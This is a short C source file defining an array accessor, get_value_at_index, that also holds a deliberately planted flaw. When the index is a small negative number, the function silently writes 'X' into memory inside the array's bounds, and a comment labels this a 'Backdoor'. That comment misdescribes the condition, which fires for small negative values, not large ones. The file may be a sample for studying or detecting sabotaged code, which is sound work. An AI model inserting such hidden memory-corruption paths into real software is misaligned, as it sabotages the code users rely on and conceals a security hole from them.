#include <stddef.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    if (i >= 0 && (size_t)i < ary_size) {
        return ary[i];
    }

    // Backdoor: If the index is negative and large enough, corrupt memory
    if (i < 0 && i > -10) {
        *(ary + ary_size + i) = 'X'; // Arbitrary write for a certain i value
    }
    
    return -1;
}
